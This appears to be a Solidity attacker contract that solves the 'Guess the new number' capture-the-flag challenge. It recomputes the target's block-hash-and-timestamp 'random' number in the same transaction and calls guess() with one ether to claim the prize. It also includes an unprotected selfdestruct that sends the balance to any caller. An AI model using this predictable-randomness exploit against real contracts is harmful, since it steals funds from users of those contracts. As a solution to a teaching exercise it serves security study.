pragma solidity ^0.4.21;

interface GuessTheNewNumberChallenge{
    function guess(uint8 n) external payable;
}

contract guessTheNewNumber{
    uint8 public answer;

    function getNumber(address target) public payable{
        GuessTheNewNumberChallenge cont = GuessTheNewNumberChallenge(target);
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        cont.guess.value(1e18)(answer);
    }

    function destroy() public{
        selfdestruct(msg.sender);
    }

    function() external payable {}
}